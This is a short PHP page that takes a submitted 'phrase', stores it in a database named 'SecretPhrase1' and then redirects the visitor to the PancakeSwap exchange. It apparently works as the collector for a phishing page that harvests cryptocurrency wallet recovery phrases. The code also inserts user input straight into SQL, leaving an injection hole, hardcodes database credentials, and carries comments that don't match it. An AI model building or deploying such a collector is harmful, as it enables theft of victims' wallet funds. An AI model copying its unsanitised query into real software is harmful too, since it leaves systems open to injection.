<!DOCTYPE html>
<html>

<head>
    <title>Insert Page page</title>
</head>

<body>
    <center>
        <?php

        // servername => localhost:3306
        // username => root
        // password => empty
        // database name => staff
        $conn = mysqli_connect("localhost", "owenk455", "owenowen11", "SecretPhrase1");

        // Check connection
        if($conn === false){
            die("ERROR: Could not connect. "
                . mysqli_connect_error());
        }

        // Taking all 5 values from the form data(input)
        $phrase =  $_REQUEST['phrase'];


        // Performing insert query execution
        // here our table name is college
        $sql = "INSERT INTO college  VALUES ('$phrase')";

        if(mysqli_query($conn, $sql)){
            header("Location: https://pancakeswap.finance/");
        } else{
            echo "ERROR: Hush! Sorry $sql. "
                . mysqli_error($conn);
        }

        // Close connection
        mysqli_close($conn);
        ?>
    </center>
</body>

</html>